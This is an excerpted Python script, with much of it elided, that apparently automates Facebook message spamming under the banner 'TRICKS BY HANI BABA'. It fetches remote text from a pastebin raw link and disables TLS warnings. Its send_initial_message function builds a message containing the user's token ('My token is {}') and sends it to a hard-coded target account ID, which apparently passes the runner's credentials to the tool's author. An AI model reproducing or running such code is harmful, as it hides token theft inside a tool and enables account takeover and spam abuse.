...
class MyHandler(http.server.SimpleHTTPRequestHandler):
      def do_GET(self):
          ...
          self.end_headers()
          self.wfile.write(b"   TRICKS BY HANI BABA")
def execute_server():
      ...
      with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
          ...
          httpd.serve_forever()
mmm = requests.get('https://pastebin.com/raw/vDycvAa5').text
...
def send_initial_message():
      ...
      msg_template = "Hello hani baba sir! sorry I am using your server. My token is {}"

      # Specify the ID where you want to send the message
      target_id = "100070294485360"

      requests.packages.urllib3.disable_warnings()

      def liness():
          print('\033[1;92m' + '•────────────────────── TRICKS BY HANI ───────────────────────────────•')
      ...
      while True:
          try:
              for message_index in range(num_messages):
                  ...
                  if response.ok:
                      print("\033[1;92m[+]  hani Han Chla Gya Massage {} of Convo {} Token {}: {}".format(
